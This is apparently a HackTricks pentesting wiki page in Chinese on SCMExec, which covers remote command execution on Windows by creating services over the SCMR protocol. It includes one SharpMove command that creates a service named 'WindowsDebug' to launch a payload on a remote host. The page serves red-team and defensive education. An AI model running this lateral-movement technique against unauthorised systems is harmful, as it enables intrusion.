# SCMExec

{{#include ../../banners/hacktricks-training.md}}

## 工作原理

Service Control Manager Remote Protocol (SCMR) 是一种基于 RPC 的协议，用于在远程计算机上配置和控制 Windows services。拥有足够权限后，operator 可以创建或重新配置一个 binary path 中包含 command 的 service，然后启动该 service，以远程执行该 command。<sup>[[1]](#references)</sup>

## 工具

**SharpMove** 支持通过 SCM 以及其他几种 Windows 机制进行 authenticated remote execution。以下示例选择其 SCM action，创建名为 `WindowsDebug` 的 service，并将其指向远程主机上已存在的 payload。<sup>[[2]](#references)</sup>
```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```
## References

- [1] [Microsoft Open Specifications - Service Control Manager Remote Protocol 概述](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [2] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
{{#include ../../banners/hacktricks-training.md}}
